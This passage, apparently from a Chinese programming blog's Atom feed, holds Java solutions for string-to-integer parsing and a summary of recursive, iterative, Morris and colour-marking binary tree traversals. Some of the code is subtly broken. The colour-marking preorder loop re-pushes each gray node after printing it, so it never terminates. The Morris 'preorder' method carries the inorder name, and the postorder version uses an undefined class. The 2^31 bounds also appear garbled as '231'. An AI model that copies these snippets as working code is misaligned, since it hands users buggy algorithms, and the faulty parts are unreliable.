或者其他类似的库函数。</p><p>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。</p><p>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。</p><p>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。</p><p>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。</p><p>在任何情况下，若函数不能进行有效的转换时，请返回 0。</p><p>说明：</p><p>假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−231,  231 − 1]。如果数值超过这个范围，请返回  INT_MAX (231 − 1) 或 INT_MIN (−231) 。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">strToInt</span><span class="hljs-params">(String str)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span>[] c = str.trim().toCharArray();<br>    <span class="hljs-keyword">if</span> (c.length == <span class="hljs-number">0</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>, bndry = Integer.MAX_VALUE / <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>, sign = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (c[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;-&#x27;</span>)&#123;sign = -<span class="hljs-number">1</span>;&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;+&#x27;</span>)&#123;i = <span class="hljs-number">0</span>;&#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i; j &lt; c.length; j++)&#123;<br>        <span class="hljs-keyword">if</span> (c[j] &lt; <span class="hljs-string">&#x27;0&#x27;</span> || c[j] &gt; <span class="hljs-string">&#x27;9&#x27;</span>)&#123;<span class="hljs-keyword">break</span>;&#125;<br>        <span class="hljs-keyword">if</span> (res &gt; bndry || res == bndry &amp;&amp; c[j] &gt; <span class="hljs-string">&#x27;7&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> sign == <span class="hljs-number">1</span> ? Integer.MAX_VALUE : Integer.MIN_VALUE;<br>        &#125;<br>        res = res * <span class="hljs-number">10</span> + (c[j] - <span class="hljs-string">&#x27;0&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> sign * res;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">记录剑指offer解法</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="剑指offer" scheme="http://example.com/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>二叉树遍历方法总结</title>
    <link href="http://example.com/2021/02/02/%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/02/02/%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2021-02-02T03:39:21.000Z</published>
    <updated>2021-02-02T13:29:55.531Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-递归遍历"><a href="#1-递归遍历" class="headerlink" title="1. 递归遍历"></a>1. 递归遍历</h1><p>递归遍历主要分为前序遍历，中序遍历和后序遍历，代码如下：</p><h2 id="1-1-前序遍历："><a href="#1-1-前序遍历：" class="headerlink" title="1.1 前序遍历："></a>1.1 前序遍历：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">preOrderTraveral</span><span class="hljs-params">(TreeNode node)</span></span>&#123;<br>       <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">return</span>;<br>       &#125;<br>       System.out.print(node.data+<span class="hljs-string">&quot; &quot;</span>);<br>       preOrderTraveral(node.leftChild);<br>       preOrderTraveral(node.rightChild);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-中序遍历："><a href="#1-2-中序遍历：" class="headerlink" title="1.2 中序遍历："></a>1.2 中序遍历：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">inOrderTraveral</span><span class="hljs-params">(TreeNode node)</span></span>&#123;<br>       <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">return</span>;<br>       &#125;<br>       inOrderTraveral(node.leftChild);<br>       System.out.print(node.data+<span class="hljs-string">&quot; &quot;</span>);<br>       inOrderTraveral(node.rightChild);<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-后序遍历："><a href="#1-3-后序遍历：" class="headerlink" title="1.3 后序遍历："></a>1.3 后序遍历：</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postOrderTraveral</span><span class="hljs-params">(TreeNode node)</span></span>&#123;<br>       <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>)&#123;<br>           <span class="hljs-keyword">return</span>;<br>       &#125;<br>       postOrderTraveral(node.leftChild);<br>       postOrderTraveral(node.rightChild);<br>       System.out.print(node.data+<span class="hljs-string">&quot; &quot;</span>);<br>   &#125;<br></code></pre></td></tr></table></figure><h1 id="2-迭代遍历"><a href="#2-迭代遍历" class="headerlink" title="2. 迭代遍历"></a>2. 迭代遍历</h1><p>因为迭代方法中没有递归中自带的压栈，所以需要自己创建一个栈模拟这个过程。</p><h2 id="2-1-前序遍历"><a href="#2-1-前序遍历" class="headerlink" title="2.1 前序遍历"></a>2.1 前序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">preorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    <span class="hljs-comment">//初始化</span><br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    Stack&lt;TreeNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    TreeNode cur = root;<br><br>    <span class="hljs-comment">//遍历</span><br>    <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span> || !stack.isEmpty())&#123;<br>        <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span>)&#123;<br>            res.add(cur.val);<br>            stack.push(cur);<br>            cur = cur.left;<br>        &#125;<br>        cur = stack.pop();<br>        cur = cur.right;<br>    &#125;<br><span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-2-中序遍历"><a href="#2-2-中序遍历" class="headerlink" title="2.2 中序遍历"></a>2.2 中序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>       <span class="hljs-comment">//初始化</span><br>       List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>       Stack&lt;TreeNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>       TreeNode cur = root;<br><br>       <span class="hljs-comment">//遍历</span><br>       <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span> || !stack.isEmpty())&#123;<br>           <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span>)&#123;<br>               stack.push(cur);<br>               cur = cur.left;<br>           &#125;<br>           cur = stack.pop();<br>           res.add(cur.val);<br>           cur = cur.right;<br>       &#125;<br>   <span class="hljs-keyword">return</span> res;<br>   &#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-后序遍历"><a href="#2-3-后序遍历" class="headerlink" title="2.3 后序遍历"></a>2.3 后序遍历</h2><p>​        迭代的时候后序遍历相比于前序和中序会更麻烦，因为左子树访问完不能直接弹出根节点，需要将右子树访问完才可以弹出。所以左子树访问完需要进行判断根节点的右子树是否访问完（判定的标准是右子树为空或者上一个访问的节点就是右子树的根节点），不满足条件说明还没访问完，进行右子树的转向。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> List&lt;Integer&gt; <span class="hljs-title">postorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    Stack&lt;TreeNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>    <br>    TreeNode cur = root;<br>    TreeNode last = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">while</span>(cur != <span class="hljs-keyword">null</span> || !stack.empty())&#123;<br>        <span class="hljs-keyword">while</span> (cur != <span class="hljs-keyword">null</span>) &#123;<br>            stack.push(cur);<br>            cur = cur.left;<br>        &#125;<br>        cur = stack.peek();<br>        <span class="hljs-keyword">if</span> (cur.right == <span class="hljs-keyword">null</span> || cur.right == last) &#123;<br>            res.add(cur.val);<br>            stack.pop();<br>            <span class="hljs-comment">// 记录上一个访问的节点</span><br>            <span class="hljs-comment">// 用于判断“访问根节点之前，右子树是否已访问过”</span><br>            last = cur;<br>            <span class="hljs-comment">// 表示不需要转向，继续弹栈</span><br>            cur = <span class="hljs-keyword">null</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            cur = cur.right;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="3-Morris遍历"><a href="#3-Morris遍历" class="headerlink" title="3 Morris遍历"></a>3 Morris遍历</h1><p>参考自<a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/solution/er-cha-shu-de-zhong-xu-bian-li-by-leetcode-solutio/">Morris遍历</a></p><p>二叉树的结构是，一个父节点可以轻松的找到子节点，但是子节点无法直接找到父节点。我们需要<strong>利用栈或者队列保存访问的记录，以便于我们可以回溯到父节点。</strong></p><p>Morris遍历的优势在于，不采用辅助结构遍历二叉树，其空间复杂度为<code>O(1)</code>。将叶子节点上的空指针利用起来，指向父节点，当再次遍历到这个节点的时候再修改回来，这样最后二叉树的结构也没有发生改变。</p><p>以中序遍历为例：</p><p>Morris 遍历算法是另一种遍历二叉树的方法，它能将非递归的中序遍历空间复杂度降为 O(1)。</p><p>Morris 遍历算法整体步骤如下（假设当前遍历到的节点为 x）：</p><ul><li>如果 x 无左孩子，先将 x 的值加入答案数组，再访问 x 的右孩子，即 $x = x.\textit{right}$</li><li>如果 x 有左孩子，则找到 x 左子树上最右的节点（即左子树中序遍历的最后一个节点，x 在中序遍历中的前驱节点），我们记为 $\textit{predecessor}$。根据 $\textit{predecessor}$ 的右孩子是否为空，进行如下操作。<ul><li>如果 $\textit{predecessor}$的右孩子为空，则将其右孩子指向 x，然后访问 x 的左孩子，即 $x = x.\textit{left}$。</li><li>如果 $\textit{predecessor}$ 的右孩子不为空，则此时其右孩子指向 x（根节点），说明我们已经遍历完 x 的左子树，我们将 ${predecessor}$ 的右孩子置空，将 x 的值加入答案数组，然后访问 x 的右孩子，即 x = $x.\textit{right}$。</li></ul></li><li>重复上述操作，直至访问完整棵树。</li></ul><p>​        其实整个过程我们就多做一步：假设当前遍历到的节点为 x，将 x 的左子树中最右边的节点的右孩子指向 x，这样在左子树遍历完成后我们通过这个指向走回了 x，且能通过这个指向知晓我们已经遍历完成了左子树，而不用再通过栈来维护，省去了栈的空间复杂度。</p><p>代码</p><h2 id="3-1-前序遍历"><a href="#3-1-前序遍历" class="headerlink" title="3.1 前序遍历"></a>3.1 前序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>    TreeNode predecessor = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">while</span> (root != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (root.left != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// predecessor 节点就是当前 root 节点向左走一步，然后一直向右走至无法走为止</span><br>            predecessor = root.left;<br>            <span class="hljs-keyword">while</span> (predecessor.right != <span class="hljs-keyword">null</span> &amp;&amp; predecessor.right != root) &#123;<br>                predecessor = predecessor.right;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (predecessor.right == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">// 让 predecessor 的右指针指向 root，继续遍历左子树，下次再访问到就不为空</span><br>                res.add(root.val);<br>                predecessor.right = root;<br>                root = root.left;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 说明左子树已经访问完了，我们需要断开链接</span><br>                predecessor.right = <span class="hljs-keyword">null</span>;<br>                root = root.right;<br>            &#125;  <br>            <br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果没有左孩子，则直接访问右孩子</span><br>            res.add(root.val);<br>            root = root.right;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-2-中序遍历"><a href="#3-2-中序遍历" class="headerlink" title="3.2 中序遍历"></a>3.2 中序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>    List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>    TreeNode predecessor = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">while</span> (root != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (root.left != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// predecessor 节点就是当前 root 节点向左走一步，然后一直向右走至无法走为止</span><br>            predecessor = root.left;<br>            <span class="hljs-keyword">while</span> (predecessor.right != <span class="hljs-keyword">null</span> &amp;&amp; predecessor.right != root) &#123;<br>                predecessor = predecessor.right;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (predecessor.right == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">// 让 predecessor 的右指针指向 root，继续遍历左子树</span><br>                predecessor.right = root;<br>                root = root.left;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 说明左子树已经访问完了，我们需要断开链接</span><br>                res.add(root.val);<br>                predecessor.right = <span class="hljs-keyword">null</span>;<br>                root = root.right;<br>            &#125;  <br>            <br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果没有左孩子，则直接访问右孩子</span><br>            res.add(root.val);<br>            root = root.right;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-3-后序遍历"><a href="#3-3-后序遍历" class="headerlink" title="3.3 后序遍历"></a>3.3 后序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postOrderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>TreeNode temp = <span class="hljs-keyword">new</span> TreeNode(<span class="hljs-keyword">new</span> Value(Value.INVALID_VALUE)), node = temp, prev = <span class="hljs-keyword">null</span>; <span class="hljs-comment">// 仅存放一个“哨兵”节点和两个临时变量，O(1)空间复杂度</span><br>temp.left = root;<br><span class="hljs-keyword">while</span> (node != <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">// 当前节点为空时，说明访问完成</span><br><span class="hljs-keyword">if</span> (node.left == <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">// 左子树不存在时，进入右节点</span><br>node = node.right;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 左子树存在，寻找前驱节点。注意寻找前驱节点时，会不断深入右子树。不加判断时，若前驱节点的右子树已指向自己，会引起死循环</span><br>prev = node.left;<br><span class="hljs-keyword">while</span> (prev.right != <span class="hljs-keyword">null</span> &amp;&amp; prev.right != node) prev = prev.right;<br><span class="hljs-keyword">if</span> (prev.right == <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">// 前驱节点未访问过，存放后继节点</span><br>prev.right = node;<br>node = node.left;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 前驱节点已访问过，恢复树结构</span><br>visitReverse(node.left, prev); <span class="hljs-comment">// 确定访问过左子树后，逆序访问沿路节点（注意与中序遍历的区别）</span><br>prev.right = <span class="hljs-keyword">null</span>;<br>node = node.right;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>    <br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">visitReverse</span><span class="hljs-params">(TreeNode node1, TreeNode node2)</span> </span>&#123;<br>reverse(node1, node2); <span class="hljs-comment">// 首先进行翻转</span><br>TreeNode node = node2; <span class="hljs-comment">// 之后进行顺序访问</span><br><span class="hljs-keyword">while</span> (node != node1) &#123;<br>visit(node);<br>node = node.right;<br>&#125;<br>visit(node1);<br>reverse(node2, node1); <span class="hljs-comment">// 恢复结构</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reverse</span><span class="hljs-params">(TreeNode node1, TreeNode node2)</span> </span>&#123;<br><span class="hljs-comment">// 实现链表翻转</span><br>TreeNode prev = node1;<br>TreeNode current = prev.right;<br>TreeNode next = current.right;<br><span class="hljs-keyword">while</span> (prev != node2) &#123;<br>current.right = prev;<br>prev = current;<br>current = next;<br>next = next.right;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-颜色标记法"><a href="#4-颜色标记法" class="headerlink" title="4. 颜色标记法"></a>4. 颜色标记法</h1><p>参考自<a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/solution/yan-se-biao-ji-fa-yi-chong-tong-yong-qie-jian-ming/">颜色标记法</a></p><p>兼具栈迭代方法的高效，又像递归方法一样简洁易懂，更重要的是，这种方法对于前序、中序、后序遍历，能够写出完全一致的代码。其核心思想如下(中序遍历 )：</p><ul><li>使用颜色标记节点的状态，新节点为白色，已访问的节点为灰色。</li><li>如果遇到的节点为白色，则将其标记为灰色，然后将其右子节点、自身、左子节点依次入栈。</li><li>如果遇到的节点为灰色，则将节点的值输出。</li></ul><p>不同遍历方式只需要调整左右子节点的入栈顺序即可。</p><h2 id="4-1-前序遍历"><a href="#4-1-前序遍历" class="headerlink" title="4.1 前序遍历"></a>4.1 前序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ColorNode</span> </span>&#123;<br>        TreeNode node;<br>        String color;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ColorNode</span><span class="hljs-params">(TreeNode node,String color)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.node = node;<br>            <span class="hljs-keyword">this</span>.color = color;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>            <br>        List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Stack&lt;ColorNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        stack.push(<span class="hljs-keyword">new</span> ColorNode(root,<span class="hljs-string">&quot;white&quot;</span>));<br>        <br>        <span class="hljs-keyword">while</span>(!stack.empty())&#123;<br>            ColorNode cn = stack.pop();<br>            <br>            <span class="hljs-keyword">if</span>(cn.color.equals(<span class="hljs-string">&quot;white&quot;</span>))&#123;<br>                <span class="hljs-keyword">if</span>(cn.node.right != <span class="hljs-keyword">null</span>) stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.right,<span class="hljs-string">&quot;white&quot;</span>));<br>                <span class="hljs-keyword">if</span>(cn.node.left != <span class="hljs-keyword">null</span>)stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.left,<span class="hljs-string">&quot;white&quot;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                res.add(cn.node.val);<br>            &#125;<br>            stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node,<span class="hljs-string">&quot;gray&quot;</span>));<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-2-中序遍历"><a href="#4-2-中序遍历" class="headerlink" title="4.2 中序遍历"></a>4.2 中序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ColorNode</span> </span>&#123;<br>        TreeNode node;<br>        String color;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ColorNode</span><span class="hljs-params">(TreeNode node,String color)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.node = node;<br>            <span class="hljs-keyword">this</span>.color = color;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>            <br>        List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Stack&lt;ColorNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        